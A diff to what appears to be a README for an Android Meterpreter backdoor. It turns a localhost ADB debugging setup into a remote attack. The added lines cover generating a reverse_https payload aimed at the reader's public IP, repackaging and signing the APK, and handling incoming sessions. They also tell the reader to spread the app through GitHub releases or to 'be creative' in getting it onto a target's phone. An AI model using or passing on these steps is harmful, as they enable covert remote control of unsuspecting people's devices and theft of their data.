@@ -18,7 +18,7 @@ Ensure you have the following tools installed and available in your system path:
 Generate the payload by targeting a local machine interface. This bypasses network domain resolution entirely during local debugging.
 
 ```bash
-msfvenom -x original_app.apk -p android/meterpreter/reverse_https LHOST127.0.0.1 LPORT4444 -o example_app.apk
+msfvenom -p android/meterpreter/reverse_https LHOST=[YOUR PUBLIC IP] LPORT=443 -o payload_example.apk
 ```
 ---
 
@@ -28,20 +28,23 @@ Decompile the binary package to modify its configuration, then recompile it to e
 
 ### 1. Decompile the APK
 ```bash
-apktool d example_app.apk -o unpacked_app_folder
+apktool d example_folder payload_example.apk 
 ```
 
 ### 2. Modify the Manifest
-Open `unpacked_app_folder/AndroidManifest.xml` in a text editor. Configure both primary entry points to explicitly allow OS execution by adding `android:exported="true"`.
-
-```xml
-<activity android:name="com.example.app.MainActivity" android:exported="true">
-<receiver android:name="com.example.app.qvqna.Ygdsa" android:exported="true">
-```
+cd example_folder
+nano AndroidManifest.xml and add these permissions:
+   ```
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
+  
+  ```
+ctrl + o then ENTER to save, ctrl + x to exit.
 
 ### 3. Recompile the APK
 ```bash
-apktool b unpacked_app_folder -o recomp_example_app.apk
+apktool b example_folder payload_example.apk
 ```
 ---
 
@@ -54,27 +57,17 @@ Android environments sometimes reject unsigned applications. Create a developmen
 keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias
 
 # Sign the recompiled APK
-apksigner sign --ks my-release-key.jks --out signed_example.apk recomp_example_app.apk
+apksigner sign --ks my-release-key.jks --out signed_example.apk payload_example.apk
 ```
 ---
 
-## Step 4: System Clearing & Deployment
+## Step 4: Installing
 
-Clear hanging processes from the local port assignment, reset the network translation layers, and install the application directly to the device's default workspace profile.
-
-```bash
-# Clear existing processes on port 4444
-sudo kill -9 $(lsof -t -i:4444) 2>/dev/null
-
-# Reset and establish ADB reverse port forwarding
-adb reverse --remove-all
-adb reverse tcp:4444 tcp:4444
-
-# Remove old installations and force-install the new package
-adb uninstall com.signed_example.app
-adb install --user 0 -r -d -g signed_example.apk
+Install onto phone using ADB or make app release on github for people to download or find a way to it get onto target phone/tablet. Be creative.
+or ADB plug in phone and enter this :
 ```
-
+adb install --bypass-low-target-sdk-block signed_payload.apk
+```
 ---
 
 ## Step 5: Session Handling & Execution
@@ -89,29 +82,22 @@ Inside the Metasploit console, execute the following handler configuration:
 ```rc
 use exploit/multi/handler
 set PAYLOAD android/meterpreter/reverse_https
-set LHOST 127.0.0.1
-set LPORT 4444
-set IgnorePayloadUUIDs true
-exploit
+set LHOST [YOUR PUBLIC IP]
+set LPORT 443
+set ExitOnSession false
+run -j
 ```
-Open new terminal, then force the device interface activity layer into the foreground, then trigger the underlying execution broadcast intent to catch the core session:
-
-```bash
-# Force-start the main activity
-adb shell am start -n com.signed_example.app/com.signed_example.app.MainActivity
-
-# Trigger the broadcast receiver
-adb shell am broadcast -n com.signed_example.app/com.signed_example.app.qvqna.Ygdsa
-```
-
 ### Expected Output
 ```text
 [*] Meterpreter session 1 opened successfully established.
 ```
-### To Do
-
-Currently this only works with ADB plugged into USB. I Need to figure out wireless meterpreter sessions.
-Android 16 seems to block it in every configuration I've tried so far...
+### Once session starts
+```
+sessions -l (to list sessions)
+sessions -i 1 (or # of session you want to open)
+```
+### BOOOOOOM!!!
+You got a meterpreter open! (type help to see commands available)
 
 Feel free to open issues or submit pull requests. Contributions are welcome!
 
